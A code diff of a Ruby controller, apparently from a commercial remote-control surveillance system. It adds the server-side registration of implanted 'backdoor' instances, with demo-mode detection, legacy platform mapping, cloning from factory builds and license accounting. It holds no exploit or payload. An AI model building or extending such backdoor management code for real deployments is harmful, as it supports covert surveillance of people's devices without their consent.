@@ -1,6 +1,8 @@
 #
 # Controller for the Backdoor objects
 #
+require 'rcs-db/license'
+
 require 'rcs-common/crypt'
 
 module RCS
@@ -39,15 +41,78 @@ class BackdoorController < RESTController
     
     request = JSON.parse(params['backdoor'])
 
-    backdoor = Item.where({_kind: 'backdoor', build: request['build_id'], instance: request['instance_id'], platform: request['subtype'].downcase}).first
+    # by default demo is off
+    demo = false
 
-    #TODO: all the backdoor.identify stuff...
+    # parse the platform to check if the backdoor is in demo mode ( -DEMO appended )
+    demo = true unless request['subtype']['-DEMO'].nil?
+    platform = request['subtype'].gsub(/-DEMO/, '').downcase
 
-    # backdoor not found, what to do ?
-    return RESTController.not_found if backdoor.nil?
+    # retro compatibility for older backdoors (pre 8.0) sending win32, win64, ios, osx
+    case platform
+      when 'win32', 'win64'
+        platform = 'windows'
+      when 'iphone'
+        platform = 'ios'
+      when 'macos'
+        platform = 'osx'
+    end
+
+    # is the backdoor already in the database? (has it synchronized at least one time?)
+    backdoor = Item.where({_kind: 'backdoor', build: request['build_id'], instance: request['instance_id'], platform: platform, demo: demo}).first
+
+    # yes it is, return the status
+    unless backdoor.nil?
+      trace :info, "#{backdoor[:name]} is synchronizing (#{backdoor[:status]})"
+
+      # if the backdoor was queued, but now we have a license, use it and set the status to open
+      # a demo backdoor will never be queued
+      if backdoor[:status] == 'queued' and LicenseManager.instance.burn_one_license(backdoor.type.to_sym, backdoor.platform.to_sym) then
+        backdoor.status = 'open'
+        backdoor.save
+      end
+
+      status = {:deleted => backdoor[:deleted], :status => backdoor[:status].upcase, :_id => backdoor[:_id]}
+      return RESTController.ok(status)
+    end
+
+    # search for the factory of that instance
+    factory = Item.where({_kind: 'factory', build: request['build_id'], status: 'open'}).first
+
+    # the status of the factory must be open otherwise no instance can be cloned from it
+    return RESTController.not_found if factory.nil?
+
+    # increment the instance counter for the factory
+    factory[:counter] += 1
+    factory.save
+
+    trace :info, "Creating new instance for #{factory[:build]} (#{factory[:counter]})"
+
+    # clone the new instance from the factory
+    backdoor = factory.clone_instance
+
+    # specialize it with the platform and the unique instance
+    backdoor.platform = platform
+    backdoor.instance = request['instance_id']
+    backdoor.demo = demo
+
+    # default is queued
+    backdoor.status = 'queued'
+
+    #TODO: add the upload files for the first sync
+
+    # demo backdoor don't consume any license
+    backdoor.status = 'open' if demo
+
+    # check the license to see if we have room for another backdoor
+    if demo == false and LicenseManager.instance.burn_one_license(backdoor.type.to_sym, backdoor.platform.to_sym) then
+      backdoor.status = 'open'
+    end
+
+    # save the new instance in the db
+    backdoor.save
 
     status = {:deleted => backdoor[:deleted], :status => backdoor[:status].upcase, :_id => backdoor[:_id]}
-        
     return RESTController.ok(status)
   end
 
